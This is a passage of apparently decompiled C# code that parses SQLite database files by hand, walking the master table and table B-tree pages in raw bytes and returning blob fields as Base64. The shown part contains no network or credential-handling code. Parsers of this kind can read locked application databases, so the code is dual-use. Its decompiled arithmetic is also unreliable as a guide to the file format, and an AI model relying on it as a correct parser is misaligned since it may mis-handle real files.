                        break;
                    }
                }

                if (num == -1)
                {
                    return null;
                }

                return GetValue(row_num, num);
            }

            private int GVL(int startIndex)
            {
                if (startIndex > db_bytes.Length)
                {
                    return 0;
                }

                int num3 = startIndex + 8;
                for (int i = startIndex; i <= num3; i++)
                {
                    if (i > db_bytes.Length - 1)
                    {
                        return 0;
                    }

                    if ((db_bytes[i] & 0x80) != 0x80)
                    {
                        return i;
                    }
                }

                return startIndex + 8;
            }

            private bool IsOdd(long value)
            {
                return (value & 1L) == 1L;
            }

            private void ReadMasterTable(ulong Offset)
            {
                if (db_bytes[(int)Offset] == 13)
                {
                    ushort num2 = Convert.ToUInt16(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3M)), 2)), decimal.One));
                    int length = 0;
                    if (master_table_entries != null)
                    {
                        length = master_table_entries.Length;
                        Array.Resize(ref master_table_entries, master_table_entries.Length + num2 + 1);
                    }
                    else
                    {
                        master_table_entries = new sqlite_master_entry[num2 + 1];
                    }

                    int num13 = num2;
                    for (int i = 0; i <= num13; i++)
                    {
                        ulong num = ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 8M), new decimal(i * 2))), 2);
                        if (decimal.Compare(new decimal(Offset), 100M) != 0)
                        {
                            num += Offset;
                        }

                        int endIndex = GVL((int)num);
                        long num7 = CVL((int)num, endIndex);
                        int num6 = GVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(endIndex), new decimal(num))), decimal.One)));
                        master_table_entries[length + i].row_id = CVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(endIndex), new decimal(num))), decimal.One)),
                            num6);
                        num = Convert.ToUInt64(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(num6), new decimal(num))), decimal.One));
                        endIndex = GVL((int)num);
                        num6 = endIndex;
                        long num5 = CVL((int)num, endIndex);
                        long[] numArray = new long[5];
                        int index = 0;
                        do
                        {
                            endIndex = num6 + 1;
                            num6 = GVL(endIndex);
                            numArray[index] = CVL(endIndex, num6);
                            if (numArray[index] > 9L)
                            {
                                if (IsOdd(numArray[index]))
                                {
                                    numArray[index] = (long)Math.Round((numArray[index] - 13L) / 2.0);
                                }
                                else
                                {
                                    numArray[index] = (long)Math.Round((numArray[index] - 12L) / 2.0);
                                }
                            }
                            else
                            {
                                numArray[index] = SQLDataTypeSize[(int)numArray[index]];
                            }

                            index++;
                        } while (index <= 4);

                        if (decimal.Compare(new decimal(encoding), decimal.One) == 0)
                        {
                            master_table_entries[length + i].item_type = Encoding.UTF8.GetString(db_bytes, Convert.ToInt32(decimal.Add(new decimal(num), new decimal(num5))), (int)numArray[0]);
                        }
                        else if (decimal.Compare(new decimal(encoding), 2M) == 0)
                        {
                            master_table_entries[length + i].item_type = Encoding.Unicode.GetString(db_bytes, Convert.ToInt32(decimal.Add(new decimal(num), new decimal(num5))), (int)numArray[0]);
                        }
                        else if (decimal.Compare(new decimal(encoding), 3M) == 0)
                        {
                            master_table_entries[length + i].item_type = Encoding.BigEndianUnicode.GetString(db_bytes, Convert.ToInt32(decimal.Add(new decimal(num), new decimal(num5))), (int)numArray[0]);
                        }

                        if (decimal.Compare(new decimal(encoding), decimal.One) == 0)
                        {
                            master_table_entries[length + i].item_name = Encoding.UTF8.GetString(db_bytes,
                                Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0]))), (int)numArray[1]);
                        }
                        else if (decimal.Compare(new decimal(encoding), 2M) == 0)
                        {
                            master_table_entries[length + i].item_name = Encoding.Unicode.GetString(db_bytes,
                                Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0]))), (int)numArray[1]);
                        }
                        else if (decimal.Compare(new decimal(encoding), 3M) == 0)
                        {
                            master_table_entries[length + i].item_name = Encoding.BigEndianUnicode.GetString(db_bytes,
                                Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0]))), (int)numArray[1]);
                        }

                        master_table_entries[length + i].root_num =
                            (long)ConvertToInteger(
                                Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0])), new decimal(numArray[1])),
                                    new decimal(numArray[2]))), (int)numArray[3]);
                        if (decimal.Compare(new decimal(encoding), decimal.One) == 0)
                        {
                            master_table_entries[length + i].sql_statement = Encoding.UTF8.GetString(db_bytes,
                                Convert.ToInt32(decimal.Add(
                                    decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0])), new decimal(numArray[1])), new decimal(numArray[2])),
                                    new decimal(numArray[3]))), (int)numArray[4]);
                        }
                        else if (decimal.Compare(new decimal(encoding), 2M) == 0)
                        {
                            master_table_entries[length + i].sql_statement = Encoding.Unicode.GetString(db_bytes,
                                Convert.ToInt32(decimal.Add(
                                    decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0])), new decimal(numArray[1])), new decimal(numArray[2])),
                                    new decimal(numArray[3]))), (int)numArray[4]);
                        }
                        else if (decimal.Compare(new decimal(encoding), 3M) == 0)
                        {
                            master_table_entries[length + i].sql_statement = Encoding.BigEndianUnicode.GetString(db_bytes,
                                Convert.ToInt32(decimal.Add(
                                    decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0])), new decimal(numArray[1])), new decimal(numArray[2])),
                                    new decimal(numArray[3]))), (int)numArray[4]);
                        }
                    }
                }
                else if (db_bytes[(int)Offset] == 5)
                {
                    ushort num11 = Convert.ToUInt16(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3M)), 2)), decimal.One));
                    int num14 = num11;
                    for (int j = 0; j <= num14; j++)
                    {
                        ushort startIndex = (ushort)ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 12M), new decimal(j * 2))), 2);
                        ReadMasterTable(decimal.Compare(new decimal(Offset), 100M) == 0
                            ? Convert.ToUInt64(decimal.Multiply(
                                decimal.Subtract(new decimal(ConvertToInteger(startIndex, 4)), decimal.One),
                                new decimal(page_size)))
                            : Convert.ToUInt64(decimal.Multiply(
                                decimal.Subtract(new decimal(ConvertToInteger((int)(Offset + startIndex), 4)), decimal.One),
                                new decimal(page_size))));
                    }

                    ReadMasterTable(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 8M)), 4)), decimal.One),
                        new decimal(page_size))));
                }
            }

            public bool ReadTable(string TableName)
            {
                int index = -1;
                int length = master_table_entries.Length - 1;
                for (int i = 0; i <= length; i++)
                {
                    if (master_table_entries[i].item_name.ToLower().CompareTo(TableName.ToLower()) == 0)
                    {
                        index = i;
                        break;
                    }
                }

                if (index == -1)
                {
                    return false;
                }

                string[] strArray = master_table_entries[index].sql_statement.Substring(master_table_entries[index].sql_statement.IndexOf("(") + 1).Split(',');
                int num6 = strArray.Length - 1;
                for (int j = 0; j <= num6; j++)
                {
                    strArray[j] = strArray[j].TrimStart();
                    int num4 = strArray[j].IndexOf(" ");
                    if (num4 > 0)
                    {
                        strArray[j] = strArray[j].Substring(0, num4);
                    }

                    if (strArray[j].IndexOf("UNIQUE") == 0)
                    {
                        break;
                    }

                    Array.Resize(ref field_names, j + 1);
                    field_names[j] = strArray[j];
                }

                return ReadTableFromOffset((ulong)((master_table_entries[index].root_num - 1L) * page_size));
            }

            private bool ReadTableFromOffset(ulong Offset)
            {
                if (db_bytes[(int)Offset] == 13)
                {
                    int num2 = Convert.ToInt32(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3M)), 2)), decimal.One));
                    int length = 0;
                    if (table_entries != null)
                    {
                        length = table_entries.Length;
                        Array.Resize(ref table_entries, table_entries.Length + num2 + 1);
                    }
                    else
                    {
                        table_entries = new table_entry[num2 + 1];
                    }

                    int num16 = num2;
                    for (int i = 0; i <= num16; i++)
                    {
                        var _fieldArray = new record_header_field[1];
                        ulong num = ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 8M), new decimal(i * 2))), 2);
                        if (decimal.Compare(new decimal(Offset), 100M) != 0)
                        {
                            num += Offset;
                        }

                        int endIndex = GVL((int)num);
                        long num9 = CVL((int)num, endIndex);
                        int num8 = GVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(endIndex), new decimal(num))), decimal.One)));
                        table_entries[length + i].row_id = CVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(endIndex), new decimal(num))), decimal.One)), num8);
                        num = Convert.ToUInt64(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(num8), new decimal(num))), decimal.One));
                        endIndex = GVL((int)num);
                        num8 = endIndex;
                        long num7 = CVL((int)num, endIndex);
                        long num10 = Convert.ToInt64(decimal.Add(decimal.Subtract(new decimal(num), new decimal(endIndex)), decimal.One));
                        for (int j = 0; num10 < num7; j++)
                        {
                            Array.Resize(ref _fieldArray, j + 1);
                            endIndex = num8 + 1;
                            num8 = GVL(endIndex);
                            _fieldArray[j].type = CVL(endIndex, num8);
                            if (_fieldArray[j].type > 9L)
                            {
                                if (IsOdd(_fieldArray[j].type))
                                {
                                    _fieldArray[j].size = (long)Math.Round((_fieldArray[j].type - 13L) / 2.0);
                                }
                                else
                                {
                                    _fieldArray[j].size = (long)Math.Round((_fieldArray[j].type - 12L) / 2.0);
                                }
                            }
                            else
                            {
                                _fieldArray[j].size = SQLDataTypeSize[(int)_fieldArray[j].type];
                            }

                            num10 = num10 + (num8 - endIndex) + 1L;
                        }

                        table_entries[length + i].content = new string[_fieldArray.Length - 1 + 1];
                        int num4 = 0;
                        int num17 = _fieldArray.Length - 1;
                        for (int k = 0; k <= num17; k++)
                        {
                            if (_fieldArray[k].type > 9L)
                            {
                                if (!IsOdd(_fieldArray[k].type))
                                {
                                    if (decimal.Compare(new decimal(encoding), decimal.One) == 0)
                                    {

                                        byte[] bytes = new byte[_fieldArray[k].size];
                                        Array.Copy(db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)), new decimal(num4))), bytes, 0, _fieldArray[k].size);

                                        table_entries[length + i].content[k] = Convert.ToBase64String(bytes);
                                    }
                                    else if (decimal.Compare(new decimal(encoding), 2M) == 0)
                                    {
                                        table_entries[length + i].content[k] = Encoding.Unicode.GetString(db_bytes,
                                            Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)), new decimal(num4))), (int)_fieldArray[k].size);
                                    }
                                    else if (decimal.Compare(new decimal(encoding), 3M) == 0)
                                    {
                                        table_entries[length + i].content[k] = Encoding.BigEndianUnicode.GetString(db_bytes,
                                            Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)), new decimal(num4))), (int)_fieldArray[k].size);
                                    }
                                }
                                else
                                {
                                    table_entries[length + i].content[k] = Encoding.UTF8.GetString(db_bytes,
                                        Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)), new decimal(num4))), (int)_fieldArray[k].size);
                                }
                            }
                            else
                            {
                                int t = Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)), new decimal(num4)));
                                table_entries[length + i].content[k] = Convert.ToString(ConvertToInteger(t,
                                    (int)_fieldArray[k].size));
                            }

                            num4 += (int)_fieldArray[k].size;
                        }
                    }
                }
                else if (db_bytes[(int)Offset] == 5)
                {
                    ushort num14 = Convert.ToUInt16(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3M)), 2)), decimal.One));
                    int num18 = num14;
                    for (int m = 0; m <= num18; m++)
                    {
                        ushort num13 = (ushort)ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 12M), new decimal(m * 2))), 2);
                        ReadTableFromOffset(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(ConvertToInteger((int)(Offset + num13), 4)), decimal.One), new decimal(page_size))));
                    }

                    ReadTableFromOffset(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 8M)), 4)), decimal.One),
                        new decimal(page_size))));
                }

                return true;
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct record_header_field
            {
                public long size;
                public long type;
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct sqlite_master_entry
            {
                public long row_id;
                public string item_type;
                public string item_name;
                public readonly string astable_name;
                public long root_num;
                public string sql_statement;
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct table_entry
            {
                public long row_id;
                public string[] content;
            }
        }
    }
}
